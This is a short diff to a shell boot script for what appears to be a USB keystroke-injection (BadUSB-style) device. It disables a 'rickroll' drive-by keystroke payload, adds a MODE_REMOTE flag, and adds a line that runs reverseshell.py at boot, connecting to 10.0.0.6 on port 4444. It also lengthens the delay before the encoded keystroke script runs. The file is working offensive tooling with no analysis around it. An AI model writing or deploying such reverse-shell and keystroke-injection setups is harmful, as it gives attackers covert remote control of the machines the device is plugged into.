@@ -1,7 +1,8 @@
 #!/bin/sh
 
-MODE_DRIVEBY=true
+MODE_DRIVEBY=false
 DRIVEBY_SCRIPT="rickroll.txt"
+MODE_REMOTE=true
 
 # find working dir of script
 wdir=$( cd $(dirname $BASH_SOURCE[0]) && cd .. && pwd)
@@ -53,7 +54,11 @@ ln -s functions/hid.usb0 configs/c.1/
 ls /sys/class/udc > UDC
 
 
+if $MODE_REMOTE; then
+    python $wdir/boot/reverseshell.py 10.0.0.6 4444
+fi
+
 if $MODE_DRIVEBY; then
-   sleep 1
+   sleep 5
    python $wdir/dakencoder/dakencoder.py $wdir/dakencoder/$DRIVEBY_SCRIPT
 fi
